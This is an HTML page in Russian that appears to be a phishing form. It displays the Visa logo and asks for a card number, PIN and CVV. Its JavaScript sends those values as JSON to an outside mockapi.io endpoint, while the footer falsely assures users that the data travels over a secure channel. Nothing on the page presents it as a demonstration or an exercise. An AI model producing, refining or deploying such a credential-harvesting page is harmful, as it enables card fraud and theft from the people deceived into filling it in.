<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ввод Пин-кода и CVV</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        input {
            width: 80%;
            padding: 10px;
            margin: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }

        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            margin-top: 20px;
        }

        button:hover {
            background-color: #0056b3;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/Visa_Logo_2014.svg" alt="Visa" class="logo">
        <h1>Введите данные карты</h1>
        
        <div class="form-group">
            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="16" required>
        </div>
        
        <div class="form-group">
            <input type="password" id="pin" placeholder="Пин-код" maxlength="4" required>
        </div>
        
        <div class="form-group">
            <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
        </div>
        
        <button onclick="submitForm()">Подтвердить</button>
        
        <div class="footer">
            <p>Данные передаются по защищенному каналу.</p>
        </div>
    </div>

    <script>
        async function submitForm() {
            const cardNumber = document.getElementById("cardNumber").value;
            const pin = document.getElementById("pin").value;
            const cvv = document.getElementById("cvv").value;

            if (cardNumber.length === 16 && pin.length === 4 && cvv.length === 3) {
                const data = {
                    cardNumber: cardNumber,
                    pin: pin,
                    cvv: cvv
                };

                try {
                    const response = await fetch('https://6766492b410f84999657405c.mockapi.io/api/card', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });

                    if (response.ok) {
                        alert("Данные успешно отправлены!");
                    } else {
                        alert("Ошибка при отправке данных. Попробуйте позже.");
                    }
                } catch (error) {
                    alert("Произошла ошибка. Попробуйте позже.");
                }
            } else {
                alert("Пожалуйста, заполните все поля корректно.");
            }
        }
    </script>

</body>
</html>
